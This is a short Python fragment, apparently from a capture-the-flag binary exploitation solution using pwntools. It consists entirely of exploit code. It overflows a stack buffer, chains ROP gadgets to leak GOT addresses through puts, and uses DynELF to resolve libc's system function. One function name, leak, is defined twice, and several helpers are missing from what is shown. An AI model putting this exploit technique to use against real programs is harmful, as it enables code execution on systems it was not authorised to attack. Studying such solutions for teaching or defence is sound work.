def leak():
	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['puts'], elf.got['read'])
	payload += p64(_start_addr)
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.recvuntil("bye~\n")
	read_addr = u64(io.recv()[:-1].ljust(8, "\x00"))
	log.info("read address: 0x%x", read_addr)

	payload  = "A"*(0x40 + 8)
	payload += com_gadget(part1, part2, elf.got['puts'], elf.got['puts'])
	payload += p64(_start_addr)    
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.recvuntil("bye~\n")
	puts_addr = u64(io.recv()[:-1].ljust(8, "\x00"))
	log.info("puts address: 0x%x" % puts_addr)

def leak_func(addr):
	# payload  = "A"*(0x40 + 8)
	# payload += com_gadget(part1, part2, elf.got['puts'], addr)
	# payload += p64(_start_addr)
	# payload  = payload.ljust(200, "A")

	payload  = "A"*(0x40 + 8)
	payload += p64(0x400763)				# pop rdi; ret
	payload += p64(addr)
	payload += p64(elf.plt['puts'])
	payload += p64(_start_addr)
	payload  = payload.ljust(200, "A")

	io.send(payload)
	io.recvuntil("bye~\n")

	data = ""
	tmp = ""
	while True:
		c = io.recv(numb=1, timeout=0.1)
		if tmp == "\n" and c == "":
			data = data[:-1] + "\x00"
			break
		else:
			data += c
			tmp = c
	data = data[:4]

	log.info("leaking: 0x%x -> %s" % (addr, (data or '').encode('hex')))
	return data

def leak():
	global system_addr

	d = DynELF(leak_func, elf=elf)
	system_addr = d.lookup('system', 'libc')
	log.info("system address: 0x%x" % system_addr)
